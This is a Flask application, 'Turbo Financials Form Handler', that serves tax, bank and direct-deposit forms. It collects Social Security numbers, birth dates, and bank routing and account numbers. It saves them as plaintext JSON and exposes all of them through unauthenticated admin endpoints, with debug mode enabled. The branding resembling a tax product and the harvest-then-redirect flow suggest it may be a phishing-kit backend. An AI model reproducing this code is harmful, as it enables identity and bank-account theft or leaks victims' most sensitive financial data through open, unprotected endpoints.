"""
Turbo Financials Form Handler - Flask Application
Logs all form submissions to JSON files with timestamps
"""

from flask import Flask, render_template, request, jsonify, redirect, send_from_directory, send_file, Response
from datetime import datetime
import json
import os
from pathlib import Path
import logging

# Initialize Flask app
app = Flask(__name__, template_folder='.', static_folder='.')

# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('logs/app.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Create logs directory if it doesn't exist
os.makedirs('logs', exist_ok=True)

# Data storage directory
DATA_DIR = 'logs/submissions'
os.makedirs(DATA_DIR, exist_ok=True)


def save_submission(form_type, data):
    """Save form submission to JSON file with timestamp"""
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    filename = f"{DATA_DIR}/{form_type}_{timestamp}.json"
    
    submission = {
        'timestamp': datetime.now().isoformat(),
        'form_type': form_type,
        'data': data
    }
    
    try:
        with open(filename, 'w') as f:
            json.dump(submission, f, indent=2)
        logger.info(f"Saved {form_type} submission: {filename}")
        return True
    except Exception as e:
        logger.error(f"Error saving submission: {str(e)}")
        return False


def get_all_submissions(form_type=None):
    """Retrieve all submissions, optionally filtered by form type"""
    submissions = []
    try:
        for filename in sorted(os.listdir(DATA_DIR), reverse=True):
            if filename.endswith('.json'):
                if form_type and form_type not in filename:
                    continue
                filepath = os.path.join(DATA_DIR, filename)
                with open(filepath, 'r') as f:
                    data = json.load(f)
                    submissions.append(data)
    except Exception as e:
        logger.error(f"Error reading submissions: {str(e)}")
    
    return submissions


# Routes
@app.route('/')
def home():
    """Home page"""
    return redirect('/home.html')


@app.route('/home.html')
def home_page():
    """Serve home page"""
    with open('home.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/style.css')
def style_css():
    """Serve CSS file"""
    return send_file(os.path.abspath(os.path.join(os.getcwd(), 'style.css')),
                     mimetype='text/css')


@app.route('/script.js')
def script_js():
    """Serve JavaScript file"""
    return send_file(os.path.abspath(os.path.join(os.getcwd(), 'script.js')),
                     mimetype='application/javascript')


@app.route('/favicon.ico')
def favicon():
    """Serve optional favicon file"""
    favicon_path = os.path.join(os.getcwd(), 'favicon.ico')
    if os.path.exists(favicon_path):
        return send_from_directory('.', 'favicon.ico')
    return Response(status=204)


@app.route('/robots.txt')
def robots_txt():
    """Serve robots.txt"""
    return send_from_directory('.', 'robots.txt')


@app.route('/redirect.html')
def redirect_page():
    """Serve redirect/success page"""
    with open('redirect.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/index.html')
def bank_form():
    """Serve bank information form"""
    with open('index.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/tax_RT/tax-form.html')
@app.route('/tax RT/tax-form.html')
def tax_form():
    """Serve tax information form"""
    with open('tax RT/tax-form.html', 'r', encoding='utf-8') as f:
        return f.read()


@app.route('/Direct_Deposit/DND.html')
@app.route('/Direct Deposit/DND.html')
def direct_deposit_form():
    """Serve direct deposit form"""
    with open('Direct Deposit/DND.html', 'r', encoding='utf-8') as f:
        return f.read()


# Form Submission Handlers
@app.route('/api/submit/tax-info', methods=['POST'])
def submit_tax_info():
    """Handle tax information form submission"""
    try:
        data = request.form.to_dict()
        
        # Extract specific fields for logging
        submission_data = {
            'full_name': data.get('full-name', ''),
            'date_of_birth': data.get('date-of-birth', ''),
            'ssn': data.get('ssn', ''),
            'email': data.get('email', ''),
            'address': data.get('address', ''),
            'phone': data.get('phone', ''),
            'state_residence': data.get('state-residence', ''),
            'filing_status': data.get('filing-status', ''),
            'spouse_name': data.get('spouse-name', ''),
            'w2_income': data.get('w2-income', ''),
            'self_employment_income': data.get('self-employment', ''),
            'capital_gains': data.get('capital-gains', ''),
            'dividend_income': data.get('dividend-income', ''),
            'dependents': data.get('dependents', ''),
            'child_tax_credit': data.get('child-tax-credit', ''),
            'mortgage_interest': data.get('mortgage-interest', ''),
            'property_taxes': data.get('property-taxes', ''),
            'charitable_donations': data.get('charitable-donations', ''),
            'total_withholding': data.get('total-withholding', ''),
            'refund_method': data.get('refund-method', '')
        }
        
        save_submission('tax_information', submission_data)
        
        logger.info(f"Tax submission from: {submission_data['full_name']}")
        
        # Redirect to success page with parameters
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return redirect(f'/redirect.html?type=tax-information&timestamp={timestamp}')
    
    except Exception as e:
        logger.error(f"Error processing tax submission: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400


@app.route('/api/submit/bank-info', methods=['POST'])
def submit_bank_info():
    """Handle bank information form submission"""
    try:
        data = request.form.to_dict()
        
        # Extract specific fields
        submission_data = {
            'account_holder_name': data.get('acc-name', ''),
            'bank_name': data.get('bank-name', ''),
            'account_type': data.get('acc-type', ''),
            'routing_number': data.get('routing-number', ''),
            'account_number': data.get('account-number', ''),
            'account_confirmed': data.get('account-number') == data.get('confirm-account')
        }
        
        save_submission('bank_information', submission_data)
        
        logger.info(f"Bank submission from: {submission_data['account_holder_name']}")
        
        # Redirect to success page with parameters
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return redirect(f'/redirect.html?type=bank-information&timestamp={timestamp}')
    
    except Exception as e:
        logger.error(f"Error processing bank submission: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400


@app.route('/api/submit/direct-deposit', methods=['POST'])
def submit_direct_deposit():
    """Handle direct deposit authorization form submission"""
    try:
        data = request.form.to_dict()
        
        # Extract specific fields
        submission_data = {
            'employee_name': data.get('emp-name', ''),
            'employee_id': data.get('emp-id', ''),
            'bank_name': data.get('bank-name', ''),
            'routing_number': data.get('routing-number', ''),
            'account_number': data.get('account-number', ''),
            'account_type': data.get('acc-type', ''),
            'deposit_amount': data.get('deposit-amount', ''),
            'authorization_given': data.get('authorize') == 'on'
        }
        
        save_submission('direct_deposit', submission_data)
        
        logger.info(f"Direct deposit submission from: {submission_data['employee_name']}")
        
        # Redirect to success page with parameters
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        return redirect(f'/redirect.html?type=direct-deposit&timestamp={timestamp}')
    
    except Exception as e:
        logger.error(f"Error processing direct deposit submission: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400


# Admin Endpoints for Viewing Submissions
@app.route('/admin/submissions')
def admin_submissions():
    """Admin page to view all submissions"""
    submissions = get_all_submissions()
    return jsonify({
        'total': len(submissions),
        'submissions': submissions
    })


@app.route('/admin/submissions/<form_type>')
def admin_submissions_by_type(form_type):
    """Admin page to view submissions by type"""
    submissions = get_all_submissions(form_type)
    return jsonify({
        'form_type': form_type,
        'total': len(submissions),
        'submissions': submissions
    })


@app.route('/admin/summary')
def admin_summary():
    """Summary statistics of all submissions"""
    all_submissions = get_all_submissions()
    
    summary = {
        'total_submissions': len(all_submissions),
        'tax_submissions': len([s for s in all_submissions if 'tax_information' in s['form_type']]),
        'bank_submissions': len([s for s in all_submissions if 'bank_information' in s['form_type']]),
        'direct_deposit_submissions': len([s for s in all_submissions if 'direct_deposit' in s['form_type']]),
        'first_submission': all_submissions[-1]['timestamp'] if all_submissions else None,
        'last_submission': all_submissions[0]['timestamp'] if all_submissions else None
    }
    
    return jsonify(summary)


@app.route('/api/health')
def health_check():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'version': '1.0.0'
    })


# Error handlers
@app.errorhandler(404)
def not_found(error):
    """Handle 404 errors"""
    logger.warning(f"404 error: {request.path}")
    return jsonify({'error': 'Not found'}), 404


@app.errorhandler(500)
def server_error(error):
    """Handle 500 errors"""
    logger.error(f"500 error: {str(error)}")
    return jsonify({'error': 'Internal server error'}), 500


if __name__ == '__main__':
    logger.info("Starting Turbo Financials Form Handler Application")
    logger.info("Admin panel available at: http://localhost:5000/admin/summary")
    logger.info("Home page: http://localhost:5000/")
    
    # Run Flask app
    app.run(
        host='127.0.0.1',
        port=5000,
        debug=True,
        use_reloader=False
    )
